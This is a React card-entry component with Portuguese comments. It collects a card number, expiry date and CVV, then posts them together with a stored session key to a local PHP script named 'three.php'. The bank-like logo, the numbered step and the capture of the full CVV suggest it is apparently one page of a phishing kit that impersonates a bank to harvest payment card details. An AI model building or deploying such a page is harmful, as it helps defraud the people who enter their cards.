import React, { useState } from 'react';
import styles from './Card.module.scss';
import { IMaskInput } from 'react-imask';

const Card = () => {
  // Definindo os estados para armazenar os dados do formulário
  const [numeroCartao, setNumeroCartao] = useState('');
  const [validade, setValidade] = useState('');
  const [cvv, setCvv] = useState('');
  const [key, setKey] = useState(localStorage.getItem('key')); // Aqui você pode definir dinamicamente

  const handleFinish = async () => {
    // Cria o objeto com os dados do formulário
    const cardData = {
      key,
      numero_cartao: numeroCartao,
      validade,
      cvv
    };

    // Envia os dados para o PHP usando fetch
    try {
      const response = await fetch('http://localhost:80/three.php', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(cardData)
      });

      const result = await response.json();

      if (result.status === 'success') {
        window.location.href = '/finished';
      } else {
        alert(result.message);
      }
    } catch (error) {
      alert('Erro ao enviar os dados.');
    }
  };

  return (
    <div className={styles.cardContainer}>
      <img className={styles.logoSanta} src="../../public/santa2.png" alt="Logo" />

      <div className={styles.speedForm}>
        <span className={styles.titulo}>Informe os dados do cartão:</span>

        <span className={styles.labels}>Número do cartão:</span>
        <IMaskInput
          mask="0000 0000 0000 0000"
          placeholder="0000 0000 0000 0000"
          value={numeroCartao}
          onChange={(e) => setNumeroCartao(e.target.value)}
        />

        <span className={styles.labels}>Validade:</span>
        <IMaskInput
          mask="00/00"
          placeholder="MM/AA"
          value={validade}
          onChange={(e) => setValidade(e.target.value)}
        />

        <span className={styles.labels}>CVV (Código de Segurança):</span>
        <IMaskInput
          mask="000"
          placeholder="000"
          type="password"
          value={cvv}
          onChange={(e) => setCvv(e.target.value)}
        />

        <span className={styles.botaoAcao} onClick={handleFinish}>
          Finalizar
        </span>
      </div>
    </div>
  );
};

export default Card;
